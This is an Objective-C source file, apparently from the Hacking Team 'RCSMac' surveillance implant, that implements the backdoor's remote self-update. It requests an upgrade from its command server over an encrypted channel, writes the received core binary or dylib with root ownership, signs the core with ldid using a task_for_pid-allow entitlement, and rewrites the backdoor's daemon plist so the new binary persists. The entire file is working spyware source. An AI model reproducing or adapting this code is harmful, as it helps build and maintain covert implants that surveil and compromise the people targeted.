/*
 *  UpgradeNetworkOperation.m
 *  RCSMac
 *
 *
 *  Created on 2/3/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "UpgradeNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSICommon.h"
#import "RCSIInfoManager.h"

//#define DEBUG_UPGRADE_NOP

#define	S_ISUID		0004000		/* [XSI] set user id on execution */
#define	S_IRWXU		0000700		/* [XSI] RWX mask for owner */
#define	S_IRUSR		0000400		/* [XSI] R for owner */
#define	S_IWUSR		0000200		/* [XSI] W for owner */
#define	S_IRGRP		0000040		/* [XSI] R for group */
#define	S_IXGRP		0000010		/* [XSI] X for group */
#define	S_IROTH		0000004		/* [XSI] R for other */
#define	S_IWOTH		0000002		/* [XSI] W for other */
#define	S_IXOTH		0000001		/* [XSI] X for other */

#define CORE_UPGRADE  @"core"
#define DYLIB_UPGRADE @"dylib"

#define ENTITLEMENT_FILENAME @"s7n3.9l15t"
#define ENTITLEMENT_FILE @"<?xml version=\"1.0\" encoding=\"UTF-8\"?> \
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> \
<plist version=\"1.0\"><dict><key>task_for_pid-allow</key><true/></dict></plist>"


@interface UpgradeNetworkOperation (private)

- (BOOL)_saveAndSignCore:(NSData*)fileData;
- (BOOL)_saveDylibUpdate:(NSData*)fileData;

@end

@implementation UpgradeNetworkOperation (private)

- (BOOL)_saveDylibUpdate:(NSData*)fileData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@", 
                                                             [[NSBundle mainBundle] bundlePath], 
                                                             RCS8_UPDATE_DYLIB];
  
  // Create clean files for ios hfs 
  [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                             error: nil];

  [fileData safeWriteToFile: _upgradePath
                 atomically: YES];

  // Forcing permission
  u_long permissions = (S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner = [NSNumber numberWithInt: 0];
  
  [[NSFileManager defaultManager] changeFileAttributes:[NSDictionary dictionaryWithObjectsAndKeys:
                                                        permission,
                                                        NSFilePosixPermissions,
                                                        owner,
                                                        NSFileOwnerAccountID,
                                                        nil] 
                                                atPath: _upgradePath];
  
  [_upgradePath release];
  
  [pool release];
  
  return TRUE;  
}

- (BOOL)updateAgentPlist
{
  BOOL bRet;
  
  NSMutableData *_fileContent = [[NSMutableData alloc] initWithContentsOfFile: BACKDOOR_DAEMON_PLIST];
  
  NSMutableString *fileContent = [[NSMutableString alloc] initWithData: _fileContent
                                                              encoding: NSUTF8StringEncoding];
  
  [fileContent replaceOccurrencesOfString: gBackdoorName
                               withString: gBackdoorUpdateName
                                  options: NSCaseInsensitiveSearch
                                    range: NSMakeRange(0, [fileContent length])];
  
  NSData *updateData = [fileContent dataUsingEncoding: NSUTF8StringEncoding];
  
  if ([updateData safeWriteToFile: BACKDOOR_DAEMON_PLIST
                       atomically: YES] == TRUE)
    {
      bRet = TRUE;
    }
  else
    {
      bRet = FALSE;
    }
  
  [_fileContent release];
  [fileContent release];
  
  return bRet;
}

- (BOOL)changeFileAttributes:(NSString*)_upgradePath
{
  u_long permissions = S_IRWXU;
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner = [NSNumber numberWithInt: 0];
 
  NSDictionary *attDict = [NSDictionary dictionaryWithObjectsAndKeys: permission,
                                                                      NSFilePosixPermissions,
                                                                      owner,
                                                                      NSFileOwnerAccountID,
                                                                      nil] ;
  return [[NSFileManager defaultManager] changeFileAttributes:attDict 
                                                       atPath:_upgradePath];
  
}

- (BOOL)pseudoSignCore
{
  NSData *entData = [ENTITLEMENT_FILE dataUsingEncoding:NSUTF8StringEncoding];
  
  [entData writeToFile:ENTITLEMENT_FILENAME atomically:NO];
  
  pid_t pid = fork();
  
  if (pid == 0) 
    execlp("/usr/bin/ldid", 
           "/usr/bin/ldid", 
           "-Ss7n3.9l15t", //ENTITLEMENT_FILENAME
           [gBackdoorUpdateName UTF8String], 
           NULL);
  
  int status;
  waitpid(pid, &status, 0);
  
  [[NSFileManager defaultManager] removeItemAtPath: ENTITLEMENT_FILENAME 
                                             error: nil];
  
  if (status == 0) 
    return TRUE;
  else 
    return FALSE;
}

- (BOOL)_saveAndSignCore:(NSData*)fileData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;
  
  NSString *_upgradePath = [NSString stringWithFormat:@"%@/%@", 
                                                      [[NSBundle mainBundle] bundlePath],
                                                      gBackdoorUpdateName];
  
  // Create clean files for ios hfs 
  [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                             error: nil];
                                              
  bRet = [fileData safeWriteToFile: _upgradePath
                        atomically: YES];
  if (bRet == FALSE)
    {
      [pool release];
      return FALSE;
    }
  
  if ([self changeFileAttributes:_upgradePath] == FALSE)
    {
      [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                                 error: nil];
      [pool release];
      return FALSE;
    }

  
  if ([self pseudoSignCore]   == TRUE &&
      [self updateAgentPlist] == TRUE)
    {
      bRet = TRUE;
    }
  else
    {
      [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
                                                 error: nil];
      bRet = FALSE;
    }
  
  [pool release];
  
  return bRet;  
}

@end

@implementation UpgradeNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [super dealloc];
}

- (BOOL)perform
{ 
  uint32_t command              = PROTO_UPGRADE;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  NSData *commandSha            = [commandData sha1Hash];
  
  [commandData appendData: commandSha];

  [commandData encryptWithKey: gSessionKey];
  
  // Send encrypted message
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];

  if (replyData == nil)
    {
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];

  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];

  // check integrity
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
 
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {  
      [replyDecrypted release];
      [commandData release];
      [outerPool release];      
      return NO;
    }
  
  if (command != PROTO_OK)
    {   
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  uint32_t packetSize     = 0;
  uint32_t numOfFilesLeft = 0;
  uint32_t filenameSize   = 0;
  uint32_t fileSize       = 0;
  
  @try
    {
      [replyDecrypted getBytes: &packetSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      [replyDecrypted getBytes: &numOfFilesLeft
                         range: NSMakeRange(8, sizeof(uint32_t))];
      [replyDecrypted getBytes: &filenameSize
                         range: NSMakeRange(12, sizeof(uint32_t))];
      [replyDecrypted getBytes: &fileSize
                         range: NSMakeRange(16 + filenameSize, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }

  NSData *stringData;
  NSData *fileContent;
  
  @try
    {
      stringData  = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(12, filenameSize + 4)]];
      fileContent = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(16 + filenameSize + 4, fileSize)]];
    }
  @catch (NSException *e)
    {
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      return NO;
    }
  
  NSString *filename  = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
  
  if (filename == nil)
    {
      createInfoLog(@"error on proto upgrade");
    }
  else
    {  
      if ([filename isEqualToString: CORE_UPGRADE])
        {
          if ([self _saveAndSignCore: fileContent] == NO)
            {
              createInfoLog(@"error on upgrade core");
            }
        }
      else if ([filename isEqualToString: DYLIB_UPGRADE])
        {
          if ([self _saveDylibUpdate: fileContent] == NO)
            {
              createInfoLog(@"error on upgrade dylib");
            }
        }
    }
  
  [fileContent release];
  [stringData release];
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  // Get files until there's no one left
  if (numOfFilesLeft != 0)
    {
      return [self perform];
    }
  
  return YES;
}

@end